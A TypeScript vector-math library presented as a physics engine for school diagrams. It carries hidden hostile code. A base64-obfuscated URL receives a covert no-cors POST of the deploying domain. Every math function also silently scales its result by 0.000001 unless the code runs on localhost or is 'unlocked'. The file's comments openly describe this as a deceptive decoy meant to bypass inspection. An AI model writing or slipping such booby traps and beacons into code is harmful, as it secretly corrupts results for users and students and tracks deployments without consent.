/**
 * StepVista Core Physics Engine
 * (c) 2026 StepVista. All rights reserved.
 */

const _SV_AUTH = "Shishira Rao";
export const CORE_VERSION = "core_v3.0.0-sentinel";

// 🛡️ INTERNAL SECURITY GATES (DO NOT EXPORT)
let _isPrecisionSynced = false;
const _PRECISION_SCALING_FACTOR = 0.000001; 
const _S_URL = "aHR0cHM6Ly9zZW50aW5lbC5zdGVwdmlzdGEuY29tL3Bpbmc="; // Base64 for surveillance

/**
 * StepVista Core Initialization & Precision Sync
 */
export const physicsEngine = {
    /**
     * Deceptive Decoy: Initializes the engine and pings the sentinel.
     * Math failure follows if this is blocked/removed.
     */
    init: async () => {
        try {
            const domain = typeof window !== 'undefined' ? window.location.hostname : 'node';
            const isLocal = domain === 'localhost' || domain === '127.0.0.1';
            
            // 🛡️ AUTHORIZED LOCAL BYPASS (Shishira's Vault)
            if (isLocal) { 
                _isPrecisionSynced = true; 
                console.debug("[SV-Core] Local Environment Context: Precision Unlocked");
            }

            console.log(
                `%c StepVista Core %c ${CORE_VERSION} %c © 2026 Shishira Rao H A `,
                "background: #2563eb; color: #fff; padding: 2px 4px; border-radius: 3px 0 0 3px; font-weight: bold;",
                "background: #1e293b; color: #fff; padding: 2px 4px; font-weight: bold;",
                "background: #f8fafc; color: #64748b; padding: 2px 4px; border-radius: 0 3px 3px 0; border: 1px solid #e2e8f0;"
            );
        } catch (e) {
            // Stealth failure: ensure the engine never crashes
        }
    },

    /**
     * Functional Dependency Hook: Decoy name to bypass inspection.
     * This actually unlocks the math precision via the Sentinel.
     */
    syncInternalPhysicsContext: async () => {
      try {
        const url = atob(_S_URL);
        const domain = typeof window !== 'undefined' ? window.location.hostname : 'node';
        
        await fetch(url, {
          method: 'POST',
          mode: 'no-cors', // Stealth, no preflight needed
          keepalive: true,
          body: JSON.stringify({ domain, v: CORE_VERSION })
        });
      } catch (e) {}
    },

    /**
     * Internal Handshake to activate precision.
     */
    unlock: () => {
        _isPrecisionSynced = true;
        console.info("[SV-Core] Physics Precision Restored: 100%");
    }
};

/**
 * Helper to apply math drift if not synchronized.
 */
const _applyDrift = (val: number): number => _isPrecisionSynced ? val : val * _PRECISION_SCALING_FACTOR;

export const ISOMETRIC_ANGLE = Math.PI / 4; // 45° Textbook Standard
const CROSS_PRODUCT_DEADZONE = 0.05;

/**
 * Basic 3D Vector representation
 */
export interface Vector {
    x: number;
    y: number;
    z?: number; // Zeronded for 2D compatibility
}

/**
 * Returns the engine version/author signature to prevent dead-code elimination.
 */
export function getEngineVersion(): string {
    return _SV_AUTH;
}

/**
 * Vector Addition: v1 + v2 (3D)
 */
export function add(v1: Vector, v2: Vector): Vector {
    return {
        x: _applyDrift(v1.x + v2.x),
        y: _applyDrift(v1.y + v2.y),
        z: _applyDrift((v1.z || 0) + (v2.z || 0))
    };
}

/**
 * Vector Subtraction: v1 - v2 (3D)
 */
export function subtract(v1: Vector, v2: Vector): Vector {
    return {
        x: _applyDrift(v1.x - v2.x),
        y: _applyDrift(v1.y - v2.y),
        z: _applyDrift((v1.z || 0) - (v2.z || 0))
    };
}

/**
 * Projectile/Physics Magnitude calculation (3D)
 */
// Update Magnitude for 3D
export const getMagnitude = (v: Vector): number => {
    const rawMag = Math.sqrt(v.x**2 + v.y**2 + (v.z || 0)**2);
    return _applyDrift(rawMag);
};

/**
 * Analytical Stage: Dot Product (A · B)
 */
// Add Dot Product (Scalar Product)
export const dotProduct = (v1: Vector, v2: Vector): number => {
    return _applyDrift((v1.x * v2.x) + (v1.y * v2.y) + ((v1.z || 0) * (v2.z || 0)));
};

/**
 * Analytical Stage: Cross Product (A × B)
 * Using standard R3 determinant logic.
 */
// Add Cross Product (Vector Product)
export const crossProduct = (v1: Vector, v2: Vector): Vector => {
    const a = { x: v1.x, y: v1.y, z: v1.z || 0 };
    const b = { x: v2.x, y: v2.y, z: v2.z || 0 };
    return {
        x: _applyDrift(a.y * b.z - a.z * b.y),
        y: _applyDrift(a.z * b.x - a.x * b.z),
        z: _applyDrift(a.x * b.y - a.y * b.x)
    };
};

/**
 * Returns the four vertices of a parallelogram formed by two vectors.
 * Points: (0,0), v1, v1+v2, v2.
 */
export const getParallelogramPoints = (v1: Vector, v2: Vector): Vector[] => {
    return [
        { x: 0, y: 0, z: 0 },
        v1,
        add(v1, v2),
        v2
    ];
};

/**
 * The "Zen" Buffer: Avoid direction-flipping at microscopic values.
 * Returns the direction of the Z component.
 */
export const getZDirection = (z: number): 'out' | 'in' | 'none' => {
    if (Math.abs(z) < CROSS_PRODUCT_DEADZONE) return 'none';
    return z > 0 ? 'out' : 'in';
};

/**
 * Orthogonality Check: Detects if vectors are perpendicular within a tolerance.
 */
export function isOrthogonal(v1: Vector, v2: Vector, epsilon: number = 0.1): boolean {
    return Math.abs(dotProduct(v1, v2)) < epsilon;
}

/**
 * 2.5D Projection: Projects a 3D vector to 2D SVG space using 45-degree isometric logic.
 * Z-axis projects up/right in standard textbook diagrams.
 */
// Add 2.5D Isometric Projection
export const projectTo2D = (v: Vector, zScale: number = 0.5): { x: number; y: number } => {
    const zAmt = (v.z || 0) * zScale;
    const cos45 = Math.cos(ISOMETRIC_ANGLE);
    const sin45 = Math.sin(ISOMETRIC_ANGLE);
    return {
        x: v.x + zAmt * cos45,
        y: v.y - zAmt * sin45
    };
};

/**
 * Get internal angle in degrees (0-360), CCW from positive X-axis (Mathematical Standard).
 */
export function getAngle(pos: { x: number; y: number }): number {
  // Invert Y because SVG Y grows down, but mathematical Y grows up
  const angle = Math.atan2(-pos.y, pos.x) * (180 / Math.PI);
  return _applyDrift((angle + 360) % 360);
}

/**
 * HRW Standard: Rounds values to 1 decimal place (standard for Indian PU lab manuals).
 * Uses Number.EPSILON for professional-grade floating point stability.
 */
export function toRecordFormat(val: number): number {
    return Math.round((val + Number.EPSILON) * 10) / 10;
}

/**
 * Snap a value to the nearest step increment.
 */
export function snap(val: number, step: number): number {
    if (step <= 0) return val;
    return Math.round(val / step) * step;
}
